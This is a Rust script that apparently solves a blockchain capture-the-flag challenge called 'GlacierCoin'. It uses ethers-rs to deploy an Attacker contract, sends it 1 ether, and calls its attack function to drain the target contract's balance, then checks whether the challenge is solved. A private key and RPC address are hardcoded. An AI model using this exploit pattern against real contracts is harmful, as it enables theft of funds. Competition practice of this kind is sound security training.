use ethers::{
    core::k256::ecdsa::SigningKey,
    prelude::*,
    utils::{hex::FromHex, parse_ether},
};
use std::{sync::Arc, time::Duration};

abigen!(Setup, "./out/Setup.sol/Setup.json");
abigen!(GlacierCoin, "./out/Challenge.sol/GlacierCoin.json");
abigen!(Attacker, "./out/Attacker.sol/Attacker.json");

pub struct Contracts {
    setup: Setup<SignerMiddleware<Provider<Http>, Wallet<SigningKey>>>,
    glacier_coin: GlacierCoin<SignerMiddleware<Provider<Http>, Wallet<SigningKey>>>,
    attacker: Attacker<SignerMiddleware<Provider<Http>, Wallet<SigningKey>>>,
}

const RPC_URL: &str = "http://34.159.107.195:18545/17490312-1a55-4fd3-a75e-c54fc50ede22";
pub static WALLET_PRIVATE_KEY: &str =
    "0xb3eeb8e0799e11a77fd5de7cc54bf58f1af5667626f3544e4ee054270cf36d32";
pub static SETUP_CONTRACT_ADDRESS: &str = "0x900f3F08F331fB0E605857c7c95c6243557A0B66";

pub static PROVIDER: Lazy<Provider<Http>> = Lazy::new(|| {
    Provider::<Http>::try_from(RPC_URL)
        .unwrap()
        .interval(Duration::from_millis(10u64))
});

pub async fn contracts() -> Contracts {
    let wallet: SignerMiddleware<Provider<Http>, LocalWallet> = {
        let signer: Wallet<SigningKey> = SigningKey::from_slice(
            Bytes::from_hex(WALLET_PRIVATE_KEY)
                .unwrap()
                .to_vec()
                .as_slice(),
        )
        .unwrap()
        .into();
        SignerMiddleware::new(
            PROVIDER.clone(),
            signer.with_chain_id(PROVIDER.get_chainid().await.unwrap().as_u64()),
        )
    };

    let client = Arc::new(wallet.clone());

    let setup: Setup<SignerMiddleware<Provider<Http>, Wallet<SigningKey>>> = Setup::new(
        SETUP_CONTRACT_ADDRESS.parse::<H160>().unwrap(),
        client.clone(),
    );
    let glacier_coin: GlacierCoin<SignerMiddleware<Provider<Http>, Wallet<SigningKey>>> =
        GlacierCoin::new(setup.target().call().await.unwrap(), client.clone());
    let attacker: Attacker<SignerMiddleware<Provider<Http>, Wallet<SigningKey>>> =
        Attacker::deploy(client.clone(), setup.address())
            .unwrap()
            .send()
            .await
            .unwrap();

    Contracts {
        setup,
        glacier_coin,
        attacker,
    }
}

// run with `cargo run -- --nocapture`
#[tokio::main]
async fn main() {
    let contracts = contracts().await;

    let target_balance = PROVIDER
        .get_balance(contracts.glacier_coin.address(), None)
        .await
        .unwrap();
    dbg!(target_balance);

    if target_balance != 0u32.into() {
        let tx = contracts.attacker.attack().value(parse_ether(1).unwrap());
        match tx.clone().send().await {
            Ok(pending_tx) => {
                pending_tx.await.unwrap();
                dbg!(&PROVIDER
                    .get_balance(contracts.glacier_coin.address(), None)
                    .await
                    .unwrap());
            }
            Err(e) => {
                if let Some(decoded_error) = e.decode_revert::<String>() {
                    panic!("{}", decoded_error);
                } else {
                    match e.as_revert() {
                        Some(revert) => {
                            panic!("{}", revert);
                        }
                        None => {
                            panic!("{}", e);
                        }
                    }
                }
            }
        }
    }

    dbg!(contracts.setup.is_solved().call().await.unwrap());
}
